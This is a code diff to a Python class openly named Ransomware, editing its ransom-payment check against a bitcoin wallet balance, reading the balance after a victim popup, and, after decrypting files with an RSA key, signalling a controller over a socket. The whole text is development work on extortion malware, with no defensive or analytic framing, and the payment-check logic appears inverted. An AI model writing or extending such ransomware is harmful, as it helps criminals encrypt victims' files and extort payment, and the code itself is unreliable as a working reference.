@@ -114,17 +114,17 @@ class Ransomware:
         return balance
 
 
-    def check_if_user_has_paid(self):
-        initial_balance =  self.get_balance(wallet_address)
-
-
+    def check_if_user_has_paid(self, initial_balance):
         current_balance = self.get_balance(wallet_address)
         change = current_balance - initial_balance
         
         if (change == 0):
+            print(bitcoin_needed)
             return True
         else:
+            initial_balance = current_balance
             return False
+        
 
 
     # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
@@ -321,6 +321,7 @@ class Ransomware:
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
+            initial_balance =  self.get_balance(wallet_address)
 
             #User has paid before the time ran out
             # self.check_if_user_has_paid()
@@ -358,6 +359,9 @@ class Ransomware:
                     key = rsa.PrivateKey.load_pkcs1(key_content.read())
 
                 self.decrypt_all_files(home, key)
+
+                self._socket.sendall(base64.b64encode("x".encode("utf-8")))
+
 
                 break
             
